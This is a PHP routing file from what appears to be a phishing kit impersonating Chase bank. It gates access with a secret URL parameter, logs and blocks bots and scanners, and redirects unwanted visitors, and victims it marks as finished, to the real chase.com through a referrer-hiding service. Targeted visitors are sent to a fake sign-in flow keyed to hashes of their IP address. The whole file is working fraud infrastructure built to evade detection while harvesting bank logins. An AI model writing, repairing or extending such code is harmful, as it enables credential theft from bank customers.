<?php
defined('SYSTEM_PATH') or die('404 not found.');

$link = 'auth/signin?indexToken=' . sha1(md5($core->_get_ses('ip'))) . '&authToken=' . md5(sha1($core->_get_ses('ip')));

if (empty($core->_get_ses('sign_in'))) {

    if (isset($_GET[$core->_config('parameter')])) {

        $core->_visitor('visiting your page.');
        $core->updateJmlh('visitor');
        $core->_save_ses('sign_in', $core->_get_ses('ip'));
        $core->_redirect($link);

    } else {

        $core->_logbot('parameter', 'Parameter Blocked', SYSTEM_PATH . '/NubicodStyle/logs/bots.log');
        $core->_blocks();
        $core->_redirect('https://href.li/?https://www.chase.com/');

    }

} else {

  if (!empty($core->_get_ses('done'))) {
      $core->_blocks();
      $core->_redirect('https://href.li/?https://www.chase.com/');
  }

  $page = @$_GET['page'];

  if (empty($page)) {

      $core->_redirect($link);

  } else {

      if (isset($page)) {
          if (file_exists(SYSTEM_PATH . '/NubicodStyle/main/' . strtolower($page) . '.nubicod.php')) {
              require_once(SYSTEM_PATH . '/NubicodStyle/main/' . strtolower($page) . '.nubicod.php');
          } else {
              exit('error.');
          }
      }

  }

}
?>
